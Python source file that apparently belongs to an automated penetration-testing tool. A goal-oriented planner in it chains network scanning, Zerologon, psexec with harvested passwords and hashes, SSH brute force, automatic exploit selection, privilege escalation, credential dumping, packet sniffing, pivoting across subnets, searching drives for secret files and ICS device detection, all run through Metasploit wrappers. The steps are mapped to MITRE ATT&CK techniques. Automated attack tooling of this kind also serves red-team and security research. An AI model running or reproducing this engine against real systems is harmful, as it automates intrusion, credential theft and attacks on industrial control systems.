from arsenal import arpscan
from arsenal import mynmap
from arsenal import msploit
from arsenal import nwscan
from arsenal import ics_detect
from arsenal import vulnscan
from database import mushilogger
import json
import random
import subprocess
import copy
import pprint
from ipaddress import IPv4Network
from ipaddress import IPv4Interface
from ipaddress import IPv4Address

class GoapSymbol():
  node = []
  link = []
  node_json = {}
  node_id = 0
  pre_node_id = 0
  mushikago_ipaddr = ""
  nettype = ""
  specify_addr = ""
  class_a = []
  class_b = []
  class_c = []
  mode = ""

  def __init__(self, actionfile):
    print("init symbol..")

    self.actions = self.load_action(actionfile)
    if "actions-it" in actionfile:
      self.mode = "it"
    elif "actions-ot" in actionfile:
      self.mode = "ot"

    #self.mushikago_ipaddr = self.get_ipaddr()

    self.class_a.append('10.0.0.0')
    for num in range(1, 256):
      self.class_a.append(str(IPv4Address('10.0.0.0') + 65536*num))

    self.class_b.append('172.16.0.0')
    for num in range(1, 16):
      self.class_b.append(str(IPv4Address('172.16.0.0') + 65536*num))

    self.class_c.append('192.168.0.0')
    for num in range(1, 256):
      self.class_c.append(str(IPv4Address('192.168.0.0') + 256*num))
   
    # goal conditions
    self.goal = {
      "GoalSymbol_AttackIcs": True, 
      "GoalSymbol_GetLocalSecretInfo": True,
      "GoalSymbol_GetNwSecretInfo": True
    }

    # current states
    self.state = {
      "Symbol_GetLanNodes": None, # T1046 T1018
      "Symbol_TcpScan": None, # T1046 T1018
      "Symbol_IdentOs": None, # TA0008
      "Symbol_InfoCollect": None, # T1119, T1083
      "Symbol_VulnScan": None, # T1046
      "Symbol_LateralMovement": None, # T1110
      "Symbol_GetNetworkInfo": None, # T1482
      "Symbol_DCCheck": None, # T1059
      "Symbol_LogonUserInfo": None, # T1087
      "Symbol_DomainUser": None,# T1087
      "Symbol_LocalUser": None, # T1078
      "Symbol_ValidUser": None, # T1136
      "Symbol_CreateUser": None, # T1003, T1059, T1082
      "Symbol_GetOsPatch": None, # TA0004
      "Symbol_PrivilegeEscalation": None, # T1057, T1059 
      "Symbol_ProcessInfo": None, # T1055
      "Symbol_ProcessMigrate": None, # T1083, TA0009, TA0010
      "Symbol_MainDriveInfo": None, # T1083, TA0009, TA0010
      "Symbol_SearchMainDrive": None, # T1083, T1135
      "Symbol_NwDriveInfo": None, # T1083, T1135
      "Symbol_SearchNwDrive": None, # TA0009
      "GoalSymbol_GetLocalSecretInfo": None, # TA0009
      "GoalSymbol_GetNwSecretInfo": None,
      "Symbol_PacketInfo": None, # T1040
      "Symbol_GetIcsProtocol": None, # T1046
      "Symbol_GetIcsDevice": None, # T1120
      "GoalSymbol_AttackIcs": None # TA0040
    }

    self.pre_exe = None

    self.mlogger = mushilogger.MushiLogger()

  def load_action(self, actionfile): 
    with open(actionfile) as f:
      return json.load(f)



  def goap_plannning(self, goap_node):
  
    available_action = []
    plan = []
  
    #print("goap planning start..")
    self.mlogger.writelog("goap planning start..", "info")
  
    # continue loop till achieve goal
    for i in range(100):
      #print("\n")
      print("\ntake = {}\n".format(i))
      #print("\n")

      if (goap_node.state["GoalSymbol_AttackIcs"] == goap_node.goal["GoalSymbol_AttackIcs"] or goap_node.state["GoalSymbol_GetLocalSecretInfo"] == goap_node.goal["GoalSymbol_GetLocalSecretInfo"] or goap_node.state["GoalSymbol_GetNwSecretInfo"] == goap_node.goal["GoalSymbol_GetNwSecretInfo"]):
        return plan
  
      for key in goap_node.actions.keys():
        match_count = 0
        for symbol, value in goap_node.actions[key]["precond"].items():
          #print("{}, {}, {}".format(key, symbol, value))
          if (goap_node.state[symbol] == value): 
            match_count += 1
        if (match_count == len(goap_node.actions[key]["precond"])):
          #print("match!!")
          available_action.append(key)
  
      #print("available_action = {}".format(available_action))
      self.mlogger.writelog("available plan = " + pprint.pformat(available_action, width=500, compact=True), "info")
  
      if (len(available_action) == 0):
        #print("No available action")
        self.mlogger.writelog("No available action", "info")
        self.mlogger.writelog("current target state = " + pprint.pformat(goap_node.state, width=500, compact=True), "info")
        return plan
        #self.node['no_action_target'] = 1
  
      # pickup executable action
      # currentry, use Dijkstra algorithm
      # A* or Dijkstra's algorithm or random
      tmp = 100
      tmp_list = []
      for key in available_action:
        if (goap_node.actions[key]["priority"] < tmp):
          priority_key = key
          tmp = goap_node.actions[key]["priority"]
          tmp_list.clear()
          tmp_list.append(priority_key)
        elif (goap_node.actions[key]["priority"] == tmp):
          tmp_list.append(key)
  
      #print("tmp_list = {}".format(tmp_list))
      #print("len(tmp_list) = {}".format(len(tmp_list)))
  
      #for i in range(len(tmp_list)):
      #  if priority_key not in plan:
      #    break
  
      while (True):
        priority_key = random.choice(tmp_list)
        if priority_key not in plan:
          break
  
      #print("{}, {}".format(priority_key, goap_node.actions[priority_key]))
  
      #print("pre_choise_key = {}".format(pre_choise_key))
  
      plan.append(priority_key)
      available_action.clear()
  
      #print("plan = {}".format(plan))
      #print("state = {}".format(goap_node.state))
  
      # reflect action result in current state
      for key, value in goap_node.actions[priority_key]["effect"].items():
        goap_node.state[key] = value
        #print("key = {}, value = {}".format(key, value))
  
      #print("state = {}".format(goap_node.state))


  def choose_high_priority_target(self, target_list):
    top_point = 0

    for ipaddr, node_num in target_list.items():
      target_point = 0
      print("ipaddr = {}".format(ipaddr))

      for port_num in range(0, len(self.node[node_num]["ports"])):
        if self.node[node_num]["ports"][port_num]["number"] == "21/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "22/tcp":
          target_point += 2
        elif self.node[node_num]["ports"][port_num]["number"] == "23/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "25/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "53/tcp":
          target_point += 2
        elif self.node[node_num]["ports"][port_num]["number"] == "80/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "88/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "110/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "135/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "139/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "143/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "389/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "443/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "445/tcp":
          target_point += 4
        elif self.node[node_num]["ports"][port_num]["number"] == "465/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "587/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "993/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "995/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "1433/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "1521/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "3306/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "3389/tcp":
          target_point += 3
        elif self.node[node_num]["ports"][port_num]["number"] == "5432/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "5900/tcp":
          target_point += 1
        elif self.node[node_num]["ports"][port_num]["number"] == "5985/tcp":
          target_point += 2
        elif self.node[node_num]["ports"][port_num]["number"] == "8080/tcp": 
          target_point += 2
        else:
          target_point += 0.2

      print("target_point = {}".format(target_point))

      if target_point > top_point:
        top_point = target_point
        target_ip = ipaddr
        target_num = node_num

    print("target_ip = {}".format(target_ip))
    return target_ip, target_num
      


  def select_target(self):
    target_list = {} 
    performed_list = {}
    #dc_list = {} 

    for num in range(1, len(self.node)): # num 0 is mushikago 
      if self.node[num]["os"] == "Linux" and self.node[num]["no_action_target"] == 0:
        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
          if len(self.node[num]["ports"]) > 0:
            for port_num in range(0, len(self.node[num]["ports"])):
              if self.node[num]["ports"][port_num]["number"] == "22/tcp" and self.node[num]["ports"][port_num]["service"] == "ssh":
                target_list[self.node[num]["id"]] = num
        else: # attacked and session is exist.
          # Devices that unsearched secret file
          if self.mode == "it": 
            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
              performed_list[self.node[num]["id"]] = num
          elif self.mode == "ot":
            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
              performed_list[self.node[num]["id"]] = num
      if self.node[num]["os"] == "Windows" and self.node[num]["no_action_target"] == 0:
        if self.node[num]["session"] == "" and self.node[num]["goap"]["Symbol_LateralMovement"] == None:
          if len(self.node[num]["ports"]) > 0:
            target_list[self.node[num]["id"]] = num
        else: # attacked and session is exist
          # Devices that unsearched secret file
          if self.mode == "it":
            if self.node[num]["goap"]["Symbol_SearchMainDrive"] == None or self.node[num]["goap"]["Symbol_SearchNwDrive"] == None:
              performed_list[self.node[num]["id"]] = num
          elif self.mode == "ot":
            if self.node[num]["goap"]["Symbol_GetIcsProtocol"] == None or self.node[num]["goap"]["Symbol_GetIcsDevice"] == None:
              performed_list[self.node[num]["id"]] = num
          # DC check
          """
          if self.node[num]["dc_ipaddr"]):
            dc_list.append(self.node[num]["dc_ipaddr"])
            for num2 in range(1, len(self.node)):
              if self.node[num2]["id"] == self.node[num]["dc_ipaddr"]:
                dc_list.pop()
            if len(dc_list) > 0: # DC scan
              exploit = msploit.MetaSploit()
              exploit.execute_socks()
              exploit.setting_route(self.node[num]["dc_ipaddr"], "255.255.255.255", self.node[num]["session"])
              nwscanInstance = nwscan.NetworkScan()
              node_id = nwscanInstance.execute_nwscan4dc(self.node[num]["dc_ipaddr"], self.node[num]["id"], self.node, self.link, node_id, True, 0) 
          """
            

    print("target_list = {}".format(target_list))
    print("performed_list = {}".format(performed_list))
    #print("dc_list = {}".format(dc_list))

    if len(performed_list) != 0:
      target, node_num = random.choice(list(performed_list.items()))
      target_list.clear()
      performed_list.clear()
      #print("goap_state = {}".format(self.node[node_num]["goap"]))
      return target, node_num, self.node[node_num]["goap"]
    elif len(target_list) != 0:
      #target, node_num = random.choice(list(target_list.items()))
      target, node_num = self.choose_high_priority_target(target_list)
      target_list.clear()
      performed_list.clear()
      #print("goap_state = {}".format(self.node[node_num]["goap"]))
      return target, node_num, self.node[node_num]["goap"]
    else:
      return None, None, None
    

  def setting_non_target(self, goap_node, target, node_num):
    self.node[node_num]["no_action_target"] = 1


  def execute_plan(self, goap_node, node_id, plan, target, node_num, mushikago_ipaddr, nettype, specify_addr):
    self.mlogger.writelog("action plan = " + pprint.pformat(plan, width=500, compact=True), "info")
    self.mushikago_ipaddr = mushikago_ipaddr
    self.nettype = nettype
    self.specify_addr = specify_addr

    for p in plan:
      print("execute action = {}".format(p))

      if p == "arpscan":
        # ARP Scan from mushikago
        if target == mushikago_ipaddr:
          pre_node_id = node_id
          arpscanInstance = arpscan.ArpScan()
          if (specify_addr):
            node_id = arpscanInstance.noexecute_arpscan(self.node, self.link, node_id, mushikago_ipaddr, nettype, specify_addr)
          else:
            node_id = arpscanInstance.execute_arpscan(self.node, self.link, node_id, mushikago_ipaddr, nettype)
          node_id = node_id + 1 # mushikago used
          self.node_json['nodes'] = self.node
          self.node_json['links'] = self.link

          if self.pre_exe == None: # If first try
            target = self.node[0]["id"]

          self.pre_exe = "T1120 (arpscan) - " + self.node[0]["id"]

          goap_node.state["Symbol_GetLanNodes"] = True
          self.node[0]["goap"] = copy.deepcopy(goap_node.state)


        # ARP Scan (Windows) from other device
        else:
          exploit = msploit.MetaSploit()
          nwaddr = IPv4Interface(target+'/16').network
          exploit.execute_arpscan(str(nwaddr[0]), "/16", self.node, node_num)

          pre_node_id = node_id
          arpscanInstance = arpscan.ArpScan()

          node_id = arpscanInstance.execute_arpscan_fm_mp(self.node, self.link, node_id, target)

          goap_node.state["Symbol_GetLanNodes"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)



      elif p == "tcpscan":
        mynmapInstance = mynmap.MyNmap()

        proxy = 0

        for num in range(pre_node_id, node_id, 1):
          mynmapInstance.execute_nmap(self.node[num]["id"], num, self.node, proxy)

        # first tcpscan
        if self.pre_exe == "T1120 (arpscan) - " + self.node[0]["id"]:
          self.pre_exe = "T1046 (tcpscan) - " + self.node[0]["id"]
          goap_node.state["Symbol_TcpScan"] = True
          goap_node.state["Symbol_IdentOs"] = True
          self.node[0]["goap"] = copy.deepcopy(goap_node.state)
        else:
          goap_node.state["Symbol_TcpScan"] = True
          goap_node.state["Symbol_IdentOs"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "info_collect":
        # Meke it later

        goap_node.state["Symbol_InfoCollect"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "vulnscan":
        vscan = vulnscan.VulnScan()
        proxy = 0
        vscan.execute_vulnscan(target, node_num, self.node, proxy)

        goap_node.state["Symbol_VulnScan"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)



      elif p == "exploit_lateral":
        res = -1

        # select lateral movement
        exploit = msploit.MetaSploit()

        if self.node[node_num]["os"] == "Windows":
          # related of AD
          for num in range(1, len(self.node)):
            if self.node[num]["dc_ipaddr"] == target:
              print("This target is domain controller...")
              self.mlogger.writelog("This target is domain controller...", "info")
              #account, hash_value = exploit.execute_zerologon(target, node_num, self.node, self.node[num]["nbname"])
              exploit.execute_zerologon(target, node_num, self.node, self.node[num]["nbname"])

          # psexec
          for num in range(1, len(self.node)):
            if len(self.node[num]["domain_account_pass"]) > 0:
              #exploit.check_addomain(target, node_num, self.node)
              #domain = self.node[node_num]["domain_info"]
              value = iter(self.node[num]["domain_account_pass"])
              for account, domain, password in zip(value, value, value):
                if 'Administrator' in account:
                  res = exploit.execute_psexec(target, node_num, self.node, mushikago_ipaddr, account, password, domain)
                  if res == 0:
                    break
                else:
                  continue
                break
            if len(self.node[num]["domain_account_hash"]) > 0:
              #exploit.check_addomain(target, node_num, self.node)
              #domain = self.node[node_num]["domain_info"]
              value = iter(self.node[num]["domain_account_hash"])
              for account, domain, password in zip(value, value, value):
                if 'Administrator' in account:
                  res = exploit.execute_psexec(target, node_num, self.node, mushikago_ipaddr, account, password, domain)
                  if res == 0:
                    break
                else:
                  continue
                break
            if len(self.node[num]["local_account_pass"]) > 0:
              domain = ""
              value = iter(self.node[num]["local_account_pass"])
              for account, password in zip(value, value):
                if 'Administrator' in account:
                  res = exploit.execute_psexec(target, node_num, self.node, mushikago_ipaddr, account, password, domain)
                  if res == 0:
                    break
                else:
                  continue
                break
            if len(self.node[num]["local_account_hash"]) > 0:
              domain = ""
              value = iter(self.node[num]["local_account_hash"])
              for account, password in zip(value, value):
                if 'Administrator' in account:
                  res = exploit.execute_psexec(target, node_num, self.node, mushikago_ipaddr, account, password, domain)
                  if res == 0:
                    break
                else:
                  continue
                break


        # ssh bruteforce (Only Linux)
        if res != 0 and self.node[node_num]["os"] == "Linux":
          exploit = msploit.MetaSploit()
          res = exploit.execute_ssh_bruteforce(target, node_num, self.node)

        # exploit using vuln
        if res != 0:
          exploit_rce_list = exploit.select_exploit_fm_vuln(target, node_num, self.node)
        if res != 0 and len(exploit_rce_list) > 0:
          res = exploit.execute_exploit(target, node_num, self.node, mushikago_ipaddr, exploit_rce_list)

        # exploit using service (http/https only)
        if res != 0:
          exploit_rce_list = exploit.select_exploit_fm_service(target, node_num, self.node)
          if len(exploit_rce_list) > 0:
            res = exploit.execute_exploit(target, node_num, self.node, mushikago_ipaddr, exploit_rce_list)

        # exploit using openport
        if res != 0:
          exploit_rce_list = exploit.select_exploit_fm_port(target, node_num, self.node)
          if len(exploit_rce_list) > 0:
            res = exploit.execute_exploit(target, node_num, self.node, mushikago_ipaddr, exploit_rce_list)

        # If success lateral movement
        if res == 0:
          goap_node.state["Symbol_LateralMovement"] = True
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
          self.pre_exe = "TA0008 (exploit_lateral) - " + target
        else: 
          goap_node.state["Symbol_LateralMovement"] = False
          self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
          self.pre_exe = "TA0008 (exploit_lateral) - " + target
          self.mlogger.writelog("replanning...", "info")
          return node_id


      elif p == "get_networkinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_ipconfig(node_num, self.node)

        exploit.execute_netstat(node_num, self.node)

        goap_node.state["Symbol_GetNetworkInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

        
      elif p == "get_processinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_ps(node_num, self.node)

        goap_node.state["Symbol_ProcessInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_dc_info":
        exploit = msploit.MetaSploit()
        exploit.get_dc_info(node_num, self.node)

        goap_node.state["Symbol_DCCheck"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_logon_user":
        exploit = msploit.MetaSploit()

        exploit.execute_getlogonuser(node_num, self.node)

        goap_node.state["Symbol_LogonUserInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_local_user":
        exploit = msploit.MetaSploit()
        exploit.execute_netuser(node_num, self.node)

        exploit.get_hash(target, node_num, self.node)

        goap_node.state["Symbol_LocalUser"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_domain_user":
        exploit = msploit.MetaSploit()
        exploit.execute_netuserdomain(node_num, self.node)

        exploit.execute_creds_tspkg(node_num, self.node)

        goap_node.state["Symbol_DomainUser"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_ospatch":
        exploit = msploit.MetaSploit()
        exploit.execute_getospatch(node_num, self.node)

        goap_node.state["Symbol_GetOsPatch"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "priv_escalation":
        exploit = msploit.MetaSploit()
        res = -1

        #exploit.execute_getlogonuser(node_num, self.node)
        if "nt authority\\system" in self.node[node_num]["logon_user"].lower():
          pass
        elif "Administrator" in self.node[node_num]["logon_user"]:
          pass
        else:
          # exploit using vuln
          exploit_lce_list = exploit.select_exploit_fm_localvuln(target, node_num, self.node)
          if len(exploit_lce_list) > 0:
            res = exploit.execute_localexploit(target, node_num, self.node, mushikago_ipaddr, exploit_lce_list)

          if res == 0:
            exploit.execute_getlogonuser(node_num, self.node)
            goap_node.state["Symbol_PrivilegeEscalation"] = True
            self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
          else: 
            goap_node.state["Symbol_PrivilegeEscalation"] = False
            self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)
            self.mlogger.writelog("replanning...", "info")
            return node_id


      elif p == "get_maindrvinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_getmaindrvinfo(node_num, self.node)

        goap_node.state["Symbol_MainDriveInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_netdrvinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_netuse(node_num, self.node)

        goap_node.state["Symbol_NetDriveInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_local_secretinfo":
        exploit = msploit.MetaSploit()
        exploit.execute_getlocalsecretinfo(node_num, self.node)

        if len(self.node[node_num]["secret_data"]) > 0:
          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = True
        else:
          goap_node.state["GoalSymbol_GetLocalSecretInfo"] = False

        goap_node.state["Symbol_SearchMainDrive"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_nw_secretinfo":
        if len(self.node[node_num]["network_drive"]) > 0:
          exploit = msploit.MetaSploit()
          exploit.execute_getnwsecretinfo(node_num, self.node)

        if len(self.node[node_num]["secret_data"]) > 0:
          goap_node.state["GoalSymbol_GetNwSecretInfo"] = True
        else:
          goap_node.state["GoalSymbol_GetNwSecretInfo"] = False

        goap_node.state["Symbol_SearchNwDrive"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "get_packetinfo":
        exploit = msploit.MetaSploit()

        if self.node[node_num]["os"] == "Windows":
          exploit.execute_sniff_win(node_num, self.node)
        elif self.node[node_num]["os"] == "Linux":
          exploit.execute_sniff_linux(node_num, self.node)

        goap_node.state["Symbol_PacketInfo"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "detect_ics_protocol":
        ics = ics_detect.IcsDetect()

        ics.detect_protocol(node_num, self.node)
        
        goap_node.state["Symbol_GetIcsProtocol"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)


      elif p == "detect_ics_device":
        ics = ics_detect.IcsDetect()
        ics.detect_device(node_num, self.node)
        
        goap_node.state["Symbol_GetIcsDevice"] = True
        self.node[node_num]["goap"] = copy.deepcopy(goap_node.state)

    return node_id


  def check_ipaddr(self, ipaddr):
    for num in range(1, len(self.node)): 
      if ipaddr == self.node[num]["id"]:
        return -1
    return 0


  def getip_from_netstat_info(self, num, ipaddr_list):
    value = iter(self.node[num]["netstat_info"])

    for ipaddr, port in zip(value, value):
      if ipaddr != self.node[0]["id"]: # If not mushikago IP address
        self.mlogger.writelog("ipaddr = " + ipaddr + ", port = " + port, "debug")
        res = self.check_ipaddr(ipaddr) # Check duplicate
        if res == 0:
          ipaddr_list[ipaddr] = num


  def scan_from_network_info(self, ipaddr_list, getnw_list):
    for num in range(1, len(self.node)): 
      if self.node[num]["session"] != "":
        #print("session is exist = {}".format(self.node[num]["id"]))
        self.mlogger.writelog("session is exist = " + self.node[num]["id"], "debug")
        if self.node[num]["goap"]["Symbol_GetNetworkInfo"] == True:
          if self.node[num]["netstat_info"] != "":
            #print("netstat_info is exist = {}".format(self.node[num]["netstat_info"]))
            self.mlogger.writelog("netstat_info is exist = " + pprint.pformat(self.node[num]["netstat_info"]), "debug")
            self.getip_from_netstat_info(num, ipaddr_list)
        else:
          getnw_list.append(num)
      else:
        self.mlogger.writelog("session is nothing = " + self.node[num]["id"], "debug")


  # If do not detect network_info, it will be execute get_networkinfo from getnw_list
  def force_get_networkinfo(self, goap_node, node_id, ipaddr_list, getnw_list):
    for node_num in getnw_list:
      #print("get_networkinfo ipaddr = {}".format(self.node[node_num]["goap"]))
      goap_node.state = copy.deepcopy(self.node[node_num]["goap"])
      target = self.node[node_num]["id"]
      plan = ["get_networkinfo"]
      node_id = goap_node.execute_plan(goap_node, node_id, plan, target, node_num, self.mushikago_ipaddr, self.nettype, self.specify_addr)

    self.scan_from_network_info(ipaddr_list, getnw_list)


  def segment_scan(self, exploit, nwscanInstance, ipaddr, node_num, node_id, pre_node_id, private_ip):
    if private_ip == 10:
      nwaddr = IPv4Interface(ipaddr+'/16').network
      delete_index = self.class_a.index(str(nwaddr[0]))
      self.class_a.pop(delete_index)
      for scan_nwaddr in self.class_a:
        self.mlogger.writelog("scan nwaddr = " + str(nwaddr), "info")
        if self.node[node_num]["session"] != "":
          exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
        node_id = nwscanInstance.execute_nwscan(scan_nwaddr, self.node[node_num]["id"], self.node, self.link, node_id, False, 10) 
        if node_id > pre_node_id:
          try:
            delete_index = self.class_a.index(scan_nwaddr)
            self.class_a.pop(delete_index)
          except:
            pass
          break
        else:
          exploit.unsetting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
    elif private_ip == 172:
      nwaddr = IPv4Interface(ipaddr+'/16').network
      delete_index = self.class_b.index(str(nwaddr[0]))
      self.class_b.pop(delete_index)
      for scan_nwaddr in self.class_b:
        self.mlogger.writelog("scan nwaddr = " + str(nwaddr), "info")
        exploit.setting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
        node_id = nwscanInstance.execute_nwscan(scan_nwaddr, self.node[node_num]["id"], self.node, self.link, node_id, False, 172) 
        if node_id > pre_node_id:
          try:
            delete_index = self.class_b.index(scan_nwaddr)
            self.class_b.pop(delete_index)
          except:
            pass
          break
        else:
          exploit.unsetting_route(scan_nwaddr, "255.255.0.0", self.node[node_num]["session"])
    elif private_ip == 192:
      for scan_nwaddr in self.class_c:
        self.mlogger.writelog("scan nwaddr = " + str(scan_nwaddr), "info")
        exploit.setting_route(scan_nwaddr, "255.255.255.0", self.node[node_num]["session"])
        node_id = nwscanInstance.execute_nwscan(scan_nwaddr, self.node[node_num]["id"], self.node, self.link, node_id, False, 192) 
        if node_id > pre_node_id:
          try:
            delete_index = self.class_c.index(scan_nwaddr)
            self.class_c.pop(delete_index)
          except:
            pass
          break
        else:
          exploit.unsetting_route(scan_nwaddr, "255.255.255.0", self.node[node_num]["session"])

    return node_id


  def network_scan(self, node_id, goap_node, mushikago_ipaddr):
    print("Starting a Network Scan...")
    self.mlogger.writelog("Starting a Network Scan...", "info")

    exploit = msploit.MetaSploit()
    exploit.execute_socks()

    nwscanInstance = nwscan.NetworkScan()

    ipaddr_list = {}
    getnw_list = []

    pre_node_id = node_id

    self.scan_from_network_info(ipaddr_list, getnw_list)

    if len(ipaddr_list) == 0 and len(getnw_list) != 0:
      print("getnw_list = {}".format(getnw_list))
      self.force_get_networkinfo(goap_node, node_id, ipaddr_list, getnw_list)
    
    if len(ipaddr_list) > 0:
      print("ipaddr_list = {}".format(ipaddr_list))
      for scan_ip, node_num in ipaddr_list.items():
        print("scan_ip = {}, node_num = {}".format(scan_ip, node_num))
        exploit.setting_route(scan_ip, "255.255.255.255", self.node[node_num]["session"])
        node_id = nwscanInstance.execute_nwscan(scan_ip, self.node[node_num]["id"], self.node, self.link, node_id, True, 0) 

    if node_id == pre_node_id:
      session_exist_list = {}
      for num in range(len(self.node)-1, -1, -1):
        if self.node[num]["session"] != "":
          session_exist_list[self.node[num]["id"]] = num

      if (len(session_exist_list) > 0):
        for ipaddr, node_num in session_exist_list.items():
          print("scan src ipaddr = {}".format(ipaddr))
          s2 = ipaddr.split('.')
          if (s2[0] == "10"):
            node_id = self.segment_scan(exploit, nwscanInstance, ipaddr, node_num, node_id, pre_node_id, 10)
            if node_id > pre_node_id:
              break
          elif (s2[0] == "172"):
            node_id = self.segment_scan(exploit, nwscanInstance, ipaddr, node_num, node_id, pre_node_id, 172)
            if node_id > pre_node_id:
              break
          elif (s2[0] == "192"):
            node_id = self.segment_scan(exploit, nwscanInstance, ipaddr, node_num, node_id, pre_node_id, 192)
            if node_id > pre_node_id:
              break

      if node_id == pre_node_id:
        s2 = mushikago_ipaddr.split('.')

        if (s2[0] == "10"):
          node_id = self.segment_scan(exploit, nwscanInstance, mushikago_ipaddr, 0, node_id, pre_node_id, 10)
        elif (s2[0] == "172"):
          node_id = self.segment_scan(exploit, nwscanInstance, mushikago_ipaddr, 0, node_id, pre_node_id, 172)
        elif (s2[0] == "192"):
          node_id = self.segment_scan(exploit, nwscanInstance, mushikago_ipaddr, 0, node_id, pre_node_id, 192)


    return node_id

